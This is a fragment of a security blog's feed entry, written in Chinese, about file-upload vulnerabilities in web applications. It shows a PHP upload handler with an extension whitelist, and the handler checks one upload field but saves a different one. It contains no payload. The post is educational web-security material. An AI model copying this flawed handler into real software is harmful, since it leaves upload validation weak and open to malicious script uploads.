class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getExt</span> <span class="params">($filename)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> substr ($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);    <span class="comment">//substr()函数返回字符串的一部分，strripos() 函数查找字符串从左到右在另一字符串中最后一次出现的位置  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    $disallowed_types = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);  </span><br><span class="line">  </span><br><span class="line">    $FilenameExt = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));     <span class="comment">//获取文件扩展名strtolower()将扩展名字符转换小写  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//判断是否在允许的扩展名里  </span></span><br><span class="line"><span class="keyword">if</span> (!in_array($FilenameExt, $disallowed_types)) &#123;            <span class="comment">//如果获取文件扩展名不在白名单数组里，则返回disallowed type。  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"disallowed type"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">else</span> &#123;  </span><br><span class="line">      </span><br><span class="line"><span class="comment">//文件名用time()函数获得10进制时间戳命名，在1-10000之间随机一个常数，防止同一秒不同用户上传文件重复，并最终用md5函数生成哈希散列命名文件。  </span></span><br><span class="line">     $filename = md5(time()+rand (<span class="number">1</span>,<span class="number">10000</span>)).<span class="string">"."</span>.$FilenameExt;         </span><br><span class="line">  </span><br><span class="line">    move_uploaded_file ($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $filename);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：upload/'</span> . $filename . <span class="string">"\n"</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。 &lt;/p&gt;
&lt;p&gt;上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。 &lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://pa55w0rd.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
